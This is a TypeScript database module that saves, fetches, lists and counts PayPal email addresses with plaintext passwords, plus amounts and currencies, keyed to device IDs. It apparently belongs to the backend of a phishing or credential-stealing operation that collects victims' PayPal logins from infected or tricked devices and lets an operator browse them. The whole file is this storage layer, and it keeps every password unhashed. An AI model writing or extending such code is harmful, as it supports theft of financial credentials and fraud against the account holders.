import type { RowDataPacket } from "mysql2";
import { v4 as uuidv4 } from "uuid";
import { pool } from "../db/pool.js";

interface PayPalAccountRow extends RowDataPacket {
  id: string;
  device_id: string;
  email: string;
  password: string;
  amount: string | null;
  currency: string;
  submitted_at: Date;
  created_at: Date;
  updated_at: Date;
}

export interface PayPalAccountInput {
  email: string;
  password: string;
  amount?: string | null;
  currency?: string;
  submittedAt?: number;
}

export interface PayPalAccountRecord {
  id: string;
  deviceId: string;
  email: string;
  password: string;
  amount: string | null;
  currency: string;
  submittedAt: Date;
  createdAt: Date;
  updatedAt: Date;
}

function mapPayPalAccount(row: PayPalAccountRow): PayPalAccountRecord {
  return {
    id: row.id,
    deviceId: row.device_id,
    email: row.email,
    password: row.password,
    amount: row.amount,
    currency: row.currency,
    submittedAt: row.submitted_at,
    createdAt: row.created_at,
    updatedAt: row.updated_at,
  };
}

export async function createPayPalAccount(
  deviceId: string,
  input: PayPalAccountInput,
): Promise<PayPalAccountRecord> {
  const email = input.email.trim();
  const password = input.password;
  const amount = input.amount?.trim() || null;
  const currency = input.currency?.trim().toUpperCase() || "USD";
  const submittedAt = input.submittedAt ? new Date(input.submittedAt) : new Date();
  const id = uuidv4();

  if (!email || !email.includes("@")) {
    throw new Error("paypal_email_invalid");
  }
  if (!password) {
    throw new Error("paypal_password_required");
  }

  await pool.query(
    `INSERT INTO device_paypal_accounts
      (id, device_id, email, password, amount, currency, submitted_at)
     VALUES (?, ?, ?, ?, ?, ?, ?)`,
    [id, deviceId, email, password, amount, currency, submittedAt],
  );

  const record = await getPayPalAccountById(id);
  if (!record) {
    throw new Error("paypal_account_save_failed");
  }
  return record;
}

export async function getPayPalAccountById(id: string): Promise<PayPalAccountRecord | null> {
  const [rows] = await pool.query<PayPalAccountRow[]>(
    "SELECT * FROM device_paypal_accounts WHERE id = ? LIMIT 1",
    [id],
  );
  const row = rows[0];
  return row ? mapPayPalAccount(row) : null;
}

export async function listPayPalAccounts(options: {
  deviceId?: string;
  limit?: number;
}): Promise<PayPalAccountRecord[]> {
  const limit = Math.min(Math.max(options.limit ?? 100, 1), 500);
  const where: string[] = [];
  const params: unknown[] = [];

  if (options.deviceId?.trim()) {
    where.push("device_id = ?");
    params.push(options.deviceId.trim());
  }

  const whereSql = where.length > 0 ? `WHERE ${where.join(" AND ")}` : "";
  const [rows] = await pool.query<PayPalAccountRow[]>(
    `SELECT * FROM device_paypal_accounts
     ${whereSql}
     ORDER BY submitted_at DESC
     LIMIT ?`,
    [...params, limit],
  );

  return rows.map(mapPayPalAccount);
}

export async function countPayPalAccounts(deviceId: string): Promise<number> {
  const id = deviceId.trim();
  if (!id) {
    return 0;
  }
  const [rows] = await pool.query<RowDataPacket[]>(
    "SELECT COUNT(1) AS cnt FROM device_paypal_accounts WHERE device_id = ?",
    [id],
  );
  return Number(rows[0]?.cnt ?? 0);
}
